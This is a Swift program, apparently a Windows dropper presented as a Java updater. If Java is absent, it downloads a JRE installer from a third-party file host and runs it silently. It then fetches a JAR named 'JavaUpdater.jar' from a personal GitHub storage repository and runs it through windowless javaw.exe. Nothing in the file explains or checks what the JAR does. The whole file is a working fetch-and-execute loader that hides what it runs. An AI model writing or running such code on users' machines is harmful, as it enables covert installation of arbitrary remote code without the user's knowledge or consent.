import Foundation
import ShellOut

func isJavaInstalled() -> Bool {
    do {
        _ = try shellOut(to: "java", arguments: ["-version"])
        return true
    } catch {
        return false
    }
}

func getJavaPath() -> String? {
    do {
        let output = try shellOut(to: "where", arguments: ["java"])
        let regex = try NSRegularExpression(pattern: "(.*)\\\\java.exe")
        if let match = regex.firstMatch(in: output, options: [], range: NSRange(location: 0, length: output.count)) {
            return String(output[Range(match.range(at: 1), in: output)!])
        }
    } catch {
        return nil
    }
    return nil
}

func download(url: String, localFilename: String) throws {
    guard let url = URL(string: url) else {
        throw NSError(domain: "Invalid URL", code: 1, userInfo: nil)
    }
    let data = try Data(contentsOf: url)
    try data.write(to: URL(fileURLWithPath: localFilename))
}

func installJavaSilently(installerPath: String) throws {
    try shellOut(to: installerPath, arguments: ["/s"])
}

func runUpdater(updaterPath: String, javaPath: String) throws {
    try shellOut(to: "\"\(javaPath)/javaw.exe\"", arguments: ["-jar", "\"\(updaterPath)\""])
}

func delete(file: String) {
    try? FileManager.default.removeItem(atPath: file)
}

func main() {
    let tempDir = NSTemporaryDirectory()

    if !isJavaInstalled() {
        let javaURL = "https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe"
        let localFilename = "\(tempDir)/jre-8u371-windows-x64.exe"
        do {
            try download(url: javaURL, localFilename: localFilename)
            try installJavaSilently(installerPath: localFilename)
            delete(file: localFilename)
        } catch {
            print("Error downloading or installing Java:", error)
            return
        }
    } else {
        print("Java is already installed.")
    }

    guard let javaPath = getJavaPath() else {
        print("Java path not found.")
        return
    }

    let updaterURL = "https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar"
    let updaterPath = "\(tempDir)/JavaUpdater.jar"

    do {
        try download(url: updaterURL, localFilename: updaterPath)
        try runUpdater(updaterPath: updaterPath, javaPath: javaPath)
    } catch {
        print("Error downloading or running updater:", error)
        return
    }
}

main()